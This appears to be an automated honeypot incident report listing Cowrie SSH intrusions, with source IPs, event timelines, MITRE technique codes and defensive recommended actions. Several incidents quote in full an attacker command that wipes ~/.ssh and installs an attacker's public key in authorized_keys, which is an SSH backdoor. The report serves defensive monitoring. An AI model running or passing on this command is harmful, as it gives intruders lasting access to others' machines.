| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:46:23` | `cowrie.session.connect` |
| `2026-05-13 16:46:23` | `cowrie.client.version` |
| `2026-05-13 16:46:23` | `cowrie.client.kex` |
| `2026-05-13 16:46:24` | `cowrie.login.success` |
| `2026-05-13 16:46:26` | `cowrie.session.params` |
| `2026-05-13 16:46:26` | `cowrie.command.input` |
| `2026-05-13 16:46:26` | `cowrie.command.failed` |
| `2026-05-13 16:46:26` | `cowrie.log.closed` |
| `2026-05-13 16:46:27` | `cowrie.session.params` |
| `2026-05-13 16:46:27` | `cowrie.command.input` |
| `2026-05-13 16:46:27` | `cowrie.session.file_download` |
| `2026-05-13 16:46:27` | `cowrie.log.closed` |
| `2026-05-13 16:46:38` | `cowrie.session.params` |
| `2026-05-13 16:46:38` | `cowrie.command.input` |
| `2026-05-13 16:46:39` | `cowrie.log.closed` |
| `2026-05-13 16:46:39` | `cowrie.session.params` |
| `2026-05-13 16:46:39` | `cowrie.command.input` |
| `2026-05-13 16:46:39` | `cowrie.log.closed` |
| `2026-05-13 16:46:40` | `cowrie.session.params` |
| `2026-05-13 16:46:40` | `cowrie.command.input` |
| `2026-05-13 16:46:40` | `cowrie.session.file_download` |
| `2026-05-13 16:46:40` | `cowrie.log.closed` |
| `2026-05-13 16:46:41` | `cowrie.session.params` |
| `2026-05-13 16:46:41` | `cowrie.command.input` |
| `2026-05-13 16:46:41` | `cowrie.log.closed` |
| `2026-05-13 16:46:42` | `cowrie.session.params` |
| `2026-05-13 16:46:42` | `cowrie.command.input` |
| `2026-05-13 16:46:42` | `cowrie.log.closed` |
| `2026-05-13 16:46:43` | `cowrie.session.params` |
| `2026-05-13 16:46:43` | `cowrie.command.input` |
| `2026-05-13 16:46:43` | `cowrie.command.input` |
| `2026-05-13 16:46:43` | `cowrie.log.closed` |
| `2026-05-13 16:46:43` | `cowrie.session.params` |
| `2026-05-13 16:46:43` | `cowrie.command.input` |
| `2026-05-13 16:46:43` | `cowrie.log.closed` |
| `2026-05-13 16:46:44` | `cowrie.session.params` |
| `2026-05-13 16:46:44` | `cowrie.command.input` |
| `2026-05-13 16:46:44` | `cowrie.log.closed` |
| `2026-05-13 16:46:45` | `cowrie.session.params` |
| `2026-05-13 16:46:45` | `cowrie.command.input` |
| `2026-05-13 16:46:45` | `cowrie.log.closed` |
| `2026-05-13 16:46:45` | `cowrie.session.params` |
| `2026-05-13 16:46:45` | `cowrie.command.input` |
| `2026-05-13 16:46:46` | `cowrie.log.closed` |
| `2026-05-13 16:46:46` | `cowrie.session.params` |
| `2026-05-13 16:46:46` | `cowrie.command.input` |
| `2026-05-13 16:46:46` | `cowrie.log.closed` |
| `2026-05-13 16:46:47` | `cowrie.session.params` |
| `2026-05-13 16:46:47` | `cowrie.command.input` |
| `2026-05-13 16:46:47` | `cowrie.log.closed` |
| `2026-05-13 16:46:48` | `cowrie.session.params` |
| `2026-05-13 16:46:48` | `cowrie.command.input` |
| `2026-05-13 16:46:48` | `cowrie.log.closed` |
| `2026-05-13 16:46:48` | `cowrie.session.params` |
| `2026-05-13 16:46:48` | `cowrie.command.input` |
| `2026-05-13 16:46:50` | `cowrie.log.closed` |
| `2026-05-13 16:46:51` | `cowrie.session.params` |
| `2026-05-13 16:46:51` | `cowrie.command.input` |
| `2026-05-13 16:46:51` | `cowrie.log.closed` |
| `2026-05-13 16:46:51` | `cowrie.session.params` |
| `2026-05-13 16:46:51` | `cowrie.command.input` |
| `2026-05-13 16:46:52` | `cowrie.log.closed` |
| `2026-05-13 16:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba989b4c2e59

| Field | Detail |
|---|---|
| **Source IP** | `163.7.9[.]55` |
| **First Seen** | 2026-05-13 16:52 |
| **Last Seen** | 2026-05-13 16:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:52:07` | `cowrie.session.connect` |
| `2026-05-13 16:52:07` | `cowrie.client.version` |
| `2026-05-13 16:52:08` | `cowrie.client.kex` |
| `2026-05-13 16:52:08` | `cowrie.login.success` |
| `2026-05-13 16:52:08` | `cowrie.session.params` |
| `2026-05-13 16:52:08` | `cowrie.command.input` |
| `2026-05-13 16:52:08` | `cowrie.command.failed` |
| `2026-05-13 16:52:09` | `cowrie.log.closed` |
| `2026-05-13 16:52:09` | `cowrie.session.params` |
| `2026-05-13 16:52:09` | `cowrie.command.input` |
| `2026-05-13 16:52:09` | `cowrie.session.file_download` |
| `2026-05-13 16:52:09` | `cowrie.log.closed` |
| `2026-05-13 16:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `163.7.9[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63709db5a8bd

| Field | Detail |
|---|---|
| **Source IP** | `163.7.9[.]55` |
| **First Seen** | 2026-05-13 16:52 |
| **Last Seen** | 2026-05-13 16:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:52:11` | `cowrie.session.connect` |
| `2026-05-13 16:52:11` | `cowrie.client.version` |
| `2026-05-13 16:52:11` | `cowrie.client.kex` |
| `2026-05-13 16:52:12` | `cowrie.login.success` |
| `2026-05-13 16:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `163.7.9[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8abd8377deca

| Field | Detail |
|---|---|
| **Source IP** | `36.112.133[.]74` |
| **First Seen** | 2026-05-13 16:54 |
| **Last Seen** | 2026-05-13 16:54 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:54:11` | `cowrie.session.connect` |
| `2026-05-13 16:54:11` | `cowrie.client.version` |
| `2026-05-13 16:54:12` | `cowrie.client.kex` |
| `2026-05-13 16:54:12` | `cowrie.login.success` |
| `2026-05-13 16:54:13` | `cowrie.session.params` |
| `2026-05-13 16:54:13` | `cowrie.command.input` |
| `2026-05-13 16:54:13` | `cowrie.command.failed` |
| `2026-05-13 16:54:13` | `cowrie.log.closed` |
| `2026-05-13 16:54:13` | `cowrie.session.params` |
| `2026-05-13 16:54:13` | `cowrie.command.input` |
| `2026-05-13 16:54:13` | `cowrie.session.file_download` |
| `2026-05-13 16:54:13` | `cowrie.log.closed` |
| `2026-05-13 16:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.112.133[.]74` to AbuseIPDB if not already reported
- [ ] Block `36.112.133[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d9b24784afa

| Field | Detail |
|---|---|
| **Source IP** | `36.112.133[.]74` |
| **First Seen** | 2026-05-13 16:54 |
| **Last Seen** | 2026-05-13 16:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:54:27` | `cowrie.session.connect` |
| `2026-05-13 16:54:27` | `cowrie.client.version` |
| `2026-05-13 16:54:28` | `cowrie.client.kex` |
| `2026-05-13 16:54:28` | `cowrie.login.success` |
| `2026-05-13 16:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.112.133[.]74` to AbuseIPDB if not already reported
- [ ] Block `36.112.133[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19f344a9b3ac

| Field | Detail |
|---|---|
| **Source IP** | `36.95.194[.]51` |
| **First Seen** | 2026-05-13 16:55 |
| **Last Seen** | 2026-05-13 16:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:55:54` | `cowrie.session.connect` |
| `2026-05-13 16:55:54` | `cowrie.client.version` |
| `2026-05-13 16:55:54` | `cowrie.client.kex` |
| `2026-05-13 16:55:54` | `cowrie.login.success` |
| `2026-05-13 16:55:54` | `cowrie.session.params` |
| `2026-05-13 16:55:54` | `cowrie.command.input` |
| `2026-05-13 16:55:54` | `cowrie.command.failed` |
| `2026-05-13 16:55:55` | `cowrie.log.closed` |
| `2026-05-13 16:55:55` | `cowrie.session.params` |
| `2026-05-13 16:55:55` | `cowrie.command.input` |
| `2026-05-13 16:55:55` | `cowrie.session.file_download` |
| `2026-05-13 16:55:55` | `cowrie.log.closed` |
| `2026-05-13 16:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.194[.]51` to AbuseIPDB if not already reported
- [ ] Block `36.95.194[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-008d96dc6c1c

| Field | Detail |
|---|---|
| **Source IP** | `36.95.194[.]51` |
| **First Seen** | 2026-05-13 16:55 |
| **Last Seen** | 2026-05-13 16:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:55:56` | `cowrie.session.connect` |
| `2026-05-13 16:55:56` | `cowrie.client.version` |
| `2026-05-13 16:55:57` | `cowrie.client.kex` |
| `2026-05-13 16:55:57` | `cowrie.login.success` |
| `2026-05-13 16:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.194[.]51` to AbuseIPDB if not already reported
- [ ] Block `36.95.194[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9360c6c855b6

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-05-13 16:56 |
| **Last Seen** | 2026-05-13 16:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:56:09` | `cowrie.session.connect` |
| `2026-05-13 16:56:09` | `cowrie.client.version` |
| `2026-05-13 16:56:09` | `cowrie.client.kex` |
| `2026-05-13 16:56:11` | `cowrie.login.success` |
| `2026-05-13 16:56:12` | `cowrie.session.params` |
| `2026-05-13 16:56:12` | `cowrie.command.input` |
| `2026-05-13 16:56:12` | `cowrie.command.failed` |
| `2026-05-13 16:56:13` | `cowrie.log.closed` |
| `2026-05-13 16:56:13` | `cowrie.session.params` |
| `2026-05-13 16:56:13` | `cowrie.command.input` |
| `2026-05-13 16:56:14` | `cowrie.session.file_download` |
| `2026-05-13 16:56:14` | `cowrie.log.closed` |
| `2026-05-13 16:56:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-effce989c94b

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-05-13 16:56 |
| **Last Seen** | 2026-05-13 16:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:56:18` | `cowrie.session.connect` |
| `2026-05-13 16:56:18` | `cowrie.client.version` |
| `2026-05-13 16:56:19` | `cowrie.client.kex` |
| `2026-05-13 16:56:20` | `cowrie.login.success` |
| `2026-05-13 16:56:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14a7ce090e25

| Field | Detail |
|---|---|
| **Source IP** | `177.229.197[.]38` |
| **First Seen** | 2026-05-13 17:00 |
| **Last Seen** | 2026-05-13 17:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:00:51` | `cowrie.session.connect` |
| `2026-05-13 17:00:51` | `cowrie.client.version` |
| `2026-05-13 17:00:52` | `cowrie.client.kex` |
| `2026-05-13 17:00:53` | `cowrie.login.success` |
| `2026-05-13 17:00:54` | `cowrie.session.params` |
| `2026-05-13 17:00:54` | `cowrie.command.input` |
| `2026-05-13 17:00:54` | `cowrie.command.failed` |
| `2026-05-13 17:00:54` | `cowrie.log.closed` |
| `2026-05-13 17:00:55` | `cowrie.session.params` |
| `2026-05-13 17:00:55` | `cowrie.command.input` |
| `2026-05-13 17:00:55` | `cowrie.session.file_download` |
| `2026-05-13 17:00:55` | `cowrie.log.closed` |
| `2026-05-13 17:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.229.197[.]38` to AbuseIPDB if not already reported
- [ ] Block `177.229.197[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2478750ceca

| Field | Detail |
|---|---|
| **Source IP** | `177.229.197[.]38` |
| **First Seen** | 2026-05-13 17:00 |
| **Last Seen** | 2026-05-13 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:00:58` | `cowrie.session.connect` |
| `2026-05-13 17:00:58` | `cowrie.client.version` |
| `2026-05-13 17:00:59` | `cowrie.client.kex` |
| `2026-05-13 17:01:00` | `cowrie.login.success` |
| `2026-05-13 17:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.229.197[.]38` to AbuseIPDB if not already reported
- [ ] Block `177.229.197[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfd100bba47c

| Field | Detail |
|---|---|
| **Source IP** | `41.90.100[.]147` |
| **First Seen** | 2026-05-13 17:24 |
| **Last Seen** | 2026-05-13 17:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:24:56` | `cowrie.session.connect` |
| `2026-05-13 17:24:56` | `cowrie.client.version` |
| `2026-05-13 17:24:56` | `cowrie.client.kex` |
| `2026-05-13 17:24:57` | `cowrie.login.success` |
| `2026-05-13 17:24:57` | `cowrie.session.params` |
| `2026-05-13 17:24:57` | `cowrie.command.input` |
| `2026-05-13 17:24:57` | `cowrie.command.failed` |
| `2026-05-13 17:24:58` | `cowrie.log.closed` |
| `2026-05-13 17:24:58` | `cowrie.session.params` |
| `2026-05-13 17:24:58` | `cowrie.command.input` |
| `2026-05-13 17:24:58` | `cowrie.session.file_download` |
| `2026-05-13 17:24:58` | `cowrie.log.closed` |
| `2026-05-13 17:25:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.90.100[.]147` to AbuseIPDB if not already reported
- [ ] Block `41.90.100[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43f259843ee9

| Field | Detail |
|---|---|
| **Source IP** | `41.90.100[.]147` |
| **First Seen** | 2026-05-13 17:25 |
| **Last Seen** | 2026-05-13 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:25:01` | `cowrie.session.connect` |
| `2026-05-13 17:25:01` | `cowrie.client.version` |
| `2026-05-13 17:25:02` | `cowrie.client.kex` |
| `2026-05-13 17:25:03` | `cowrie.login.success` |
| `2026-05-13 17:25:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.90.100[.]147` to AbuseIPDB if not already reported
- [ ] Block `41.90.100[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47e93eaa7c32

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-05-13 17:46 |
| **Last Seen** | 2026-05-13 17:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:46:18` | `cowrie.session.connect` |
| `2026-05-13 17:46:18` | `cowrie.client.version` |
| `2026-05-13 17:46:19` | `cowrie.client.kex` |
| `2026-05-13 17:46:20` | `cowrie.login.success` |
| `2026-05-13 17:46:21` | `cowrie.session.params` |
| `2026-05-13 17:46:21` | `cowrie.command.input` |
| `2026-05-13 17:46:21` | `cowrie.command.failed` |
| `2026-05-13 17:46:22` | `cowrie.log.closed` |
| `2026-05-13 17:46:22` | `cowrie.session.params` |
| `2026-05-13 17:46:22` | `cowrie.command.input` |
| `2026-05-13 17:46:23` | `cowrie.session.file_download` |
| `2026-05-13 17:46:23` | `cowrie.log.closed` |
| `2026-05-13 17:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b1d30ed0a6a

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-05-13 17:46 |
| **Last Seen** | 2026-05-13 17:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:46:27` | `cowrie.session.connect` |
| `2026-05-13 17:46:27` | `cowrie.client.version` |
| `2026-05-13 17:46:27` | `cowrie.client.kex` |
| `2026-05-13 17:46:29` | `cowrie.login.success` |
| `2026-05-13 17:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a9b56760671

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-05-13 17:48 |
| **Last Seen** | 2026-05-13 17:48 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
